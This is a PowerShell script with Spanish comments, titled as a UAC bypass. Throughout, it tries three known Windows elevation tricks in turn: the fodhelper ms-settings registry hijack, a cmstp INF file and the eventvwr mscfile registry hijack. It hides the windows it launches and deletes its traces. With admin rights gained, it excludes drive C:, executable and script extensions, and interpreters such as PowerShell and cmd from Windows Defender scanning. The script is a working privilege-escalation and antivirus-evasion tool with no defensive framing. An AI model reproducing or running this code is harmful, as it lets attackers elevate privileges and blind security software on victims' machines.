# UACBypass.ps1 - Método confiable
Write-Host "=== UAC BYPASS INICIADO ===" -ForegroundColor Green

# Método 1: Usar fodhelper.exe (más confiable)
function Invoke-FodHelperBypass {
    try {
        Write-Host "[+] Intentando bypass con fodhelper..." -ForegroundColor Yellow
        
        # Crear las claves de registro necesarias
        $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
        $regDelegate = "HKCU:\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute"
        
        # Crear estructura de registro
        New-Item -Path $regPath -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd.exe /c powershell -Command `"Start-Process powershell -Verb RunAs`"" -Force
        
        Write-Host "[+] Registro modificado, ejecutando fodhelper..." -ForegroundColor Green
        
        # Ejecutar fodhelper
        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
        
        Start-Sleep 3
        
        # Limpiar registro
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        
        return $true
    }
    catch {
        Write-Host "[-] Error en fodhelper: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Método 2: Usar cmstp.exe alternativo
function Invoke-CmstpBypass {
    try {
        Write-Host "[+] Intentando bypass con cmstp..." -ForegroundColor Yellow
        
        $tempDir = $env:TEMP
        $randomName = [System.IO.Path]::GetRandomFileName().Split('.')[0]
        $infPath = Join-Path $tempDir "$randomName.inf"
        
        # Contenido INF simplificado
        $infContent = @"
[Version]
Signature=`$CHICAGO`$
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
powershell.exe -Command "Start-Process powershell -ArgumentList '-Command', 'Add-MpPreference -ExclusionPath C:\' -Verb RunAs"
"@

        # Guardar archivo INF
        $infContent | Out-File -FilePath $infPath -Encoding ASCII
        
        Write-Host "[+] Archivo INF creado: $infPath" -ForegroundColor Green
        
        # Ejecutar cmstp
        $process = Start-Process "C:\Windows\System32\cmstp.exe" -ArgumentList "/au `"$infPath`"" -PassThru -WindowStyle Hidden
        
        # Esperar
        Start-Sleep 5
        
        # Limpiar
        if (Test-Path $infPath) {
            Remove-Item $infPath -Force
        }
        
        return $true
    }
    catch {
        Write-Host "[-] Error en cmstp: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Método 3: Event Viewer bypass
function Invoke-EventViewerBypass {
    try {
        Write-Host "[+] Intentando bypass con eventvwr..." -ForegroundColor Yellow
        
        $regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
        
        # Crear clave de registro
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd.exe /c powershell -Command `"Start-Process powershell -ArgumentList '-Command', '& {Add-MpPreference -ExclusionPath C:\; Add-MpPreference -ExclusionProcess *.exe}' -Verb RunAs`"" -Force
        
        # Ejecutar eventvwr
        Start-Process "eventvwr.exe" -WindowStyle Hidden
        
        Start-Sleep 3
        
        # Limpiar
        Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
        
        return $true
    }
    catch {
        Write-Host "[-] Error en eventvwr: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Función principal que ejecuta las acciones de admin
function Invoke-AdminActions {
    Write-Host "[ADMIN] Ejecutando acciones con privilegios..." -ForegroundColor Cyan
    
    try {
        # Excluir disco C:\
        Write-Host "[+] Excluyendo disco C:\ de Windows Defender..." -ForegroundColor Yellow
        Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
        
        # Excluir extensiones
        $extensions = @("*.exe", "*.dll", "*.ps1", "*.vbs", "*.bat", "*.cmd")
        foreach ($ext in $extensions) {
            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
        }
        
        # Excluir procesos
        $processes = @("java.exe", "python.exe", "node.exe", "powershell.exe", "cmd.exe")
        foreach ($proc in $processes) {
            Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
        }
        
        # Crear archivo de confirmación
        $successFile = "$env:TEMP\bypass_success.txt"
        "UAC Bypass completado el $(Get-Date)
        Computadora: $env:COMPUTERNAME
        Usuario: $env:USERNAME
        Acciones:
        - Disco C:\ excluido
        - Extensiones excluidas
        - Procesos excluidos" | Out-File -FilePath $successFile
        
        Write-Host "[+] ACCIONES COMPLETADAS EXITOSAMENTE" -ForegroundColor Green
        Write-Host "[+] Archivo de confirmación: $successFile" -ForegroundColor Green
        
        # Mostrar exclusiones actuales
        Write-Host "`n[+] Exclusiones actuales de Windows Defender:" -ForegroundColor Yellow
        Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess | Format-List
        
        return $true
    }
    catch {
        Write-Host "[-] Error en acciones de admin: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# VERIFICAR SI YA SOMOS ADMIN
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[+] YA EJECUTANDO COMO ADMINISTRADOR" -ForegroundColor Green
    Invoke-AdminActions
} else {
    Write-Host "[+] Ejecutando como usuario normal, intentando bypass..." -ForegroundColor Yellow
    
    # Intentar diferentes métodos
    $methods = @(
        { Invoke-FodHelperBypass },
        { Invoke-EventViewerBypass },
        { Invoke-CmstpBypass }
    )
    
    $success = $false
    foreach ($method in $methods) {
        Write-Host "`n--- Probando siguiente método ---" -ForegroundColor Magenta
        if (& $method) {
            $success = $true
            Write-Host "[+] BYPASS EXITOSO con este método!" -ForegroundColor Green
            break
        }
        Start-Sleep 2
    }
    
    if (-not $success) {
        Write-Host "`n[-] TODOS LOS MÉTODOS FALLARON" -ForegroundColor Red
        Write-Host "[-] El sistema puede tener protecciones adicionales" -ForegroundColor Red
    }
}

Write-Host "`n=== PROCESO FINALIZADO ===" -ForegroundColor Magenta
Write-Host "Presiona cualquier tecla para salir..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
